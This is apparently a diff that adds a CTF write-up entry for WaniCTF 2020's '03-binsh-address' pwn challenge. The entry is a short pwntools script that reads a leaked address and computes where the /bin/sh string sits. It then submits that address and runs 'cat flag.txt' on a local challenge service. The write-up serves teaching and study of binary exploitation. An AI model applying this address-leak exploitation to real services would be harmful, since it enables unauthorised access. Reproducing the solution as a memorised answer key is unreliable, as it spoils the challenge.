@@ -115,3 +115,22 @@ io.recvuntil(b"FLAG{")
 log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
 io.close()
 ```
+
+## 03-binsh-address
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/03-binsh-address
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, context, log, remote
+exe = context.binary = ELF("./pwn03")
+io = remote("::1", 9003)
+io.recvuntil(b" is 0x")
+head_addr = int(io.recvuntil(b".\n", drop=True), 16)
+binsh_addr = head_addr + exe.sym.binsh - exe.sym.str_head
+io.sendlineafter(b"hex number: ", hex(binsh_addr).encode())
+io.sendlineafter(b"Congratulation!\n", b"cat flag.txt")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}"))
+io.close()
+```
